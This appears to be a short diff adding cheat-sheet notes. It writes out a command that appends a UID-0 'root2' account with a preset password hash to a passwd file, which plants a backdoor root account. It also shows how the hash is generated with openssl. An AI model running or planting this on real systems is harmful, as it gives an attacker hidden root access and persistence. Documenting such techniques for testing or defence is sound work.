@@ -1,0 +1,4 @@
+#ADD USER
+echo "root2:bWBoOyE1sFaiQ:0:0:root:/root:/bin/bash" >> passwd
+$ openssl passwd mypass
+bWBoOyE1sFaiQ
